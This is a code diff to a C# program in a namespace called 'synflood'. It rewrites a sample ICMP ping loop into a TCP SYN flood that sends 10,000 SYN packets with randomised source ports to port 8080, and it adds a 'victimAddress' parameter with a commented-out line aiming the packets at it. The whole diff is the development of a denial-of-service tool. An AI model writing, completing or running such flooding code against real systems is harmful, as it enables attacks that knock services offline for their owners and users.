@@ -65,9 +65,9 @@ namespace synflood
             return (answer);
         }
 
-        static void MainSynFlood(string[] args)
+        static void MainSynFlood(IpV4Address victimAddress)
         {
-
+            Random rand = new Random((int)DateTime.Now.Ticks);
             IList<LivePacketDevice> allDevices = LivePacketDevice.AllLocalMachine;
 
             if (allDevices.Count == 0)
@@ -130,9 +130,6 @@ namespace synflood
                     // The rest of the important parameters will be set for each packet
                 };
 
-                // ICMP Layer
-                IcmpEchoLayer icmpLayer = new IcmpEchoLayer();
-
                 // TCP LAYER
                 TcpLayer tcpLayer = new TcpLayer();
                 tcpLayer.ControlBits = TcpControlBits.Synchronize;
@@ -141,15 +138,16 @@ namespace synflood
                 PacketBuilder builder = new PacketBuilder(ethernetLayer, ipV4Layer, tcpLayer);
 
                 // Send 100 Pings to different destination with different parameters
-                for (int i = 0; i != 100; ++i)
+                for (int i = 0; i != 10000; ++i)
                 {
                     // Set IPv4 parameters
+                    // ipV4Layer.CurrentDestination = victimAddress;
                     ipV4Layer.CurrentDestination = new IpV4Address("2.3.4." + i);
                     ipV4Layer.Identification = (ushort)i;
 
-                    // Set ICMP parameters
-                    icmpLayer.SequenceNumber = (ushort)i;
-                    icmpLayer.Identifier = (ushort)i;
+                    // Set TCP parameters
+                    tcpLayer.SourcePort = (ushort)(rand.Next(0, 1000) + 33000);
+                    tcpLayer.DestinationPort = (ushort)8080;
 
                     // Build the packet
                     Packet packet = builder.Build(DateTime.Now);
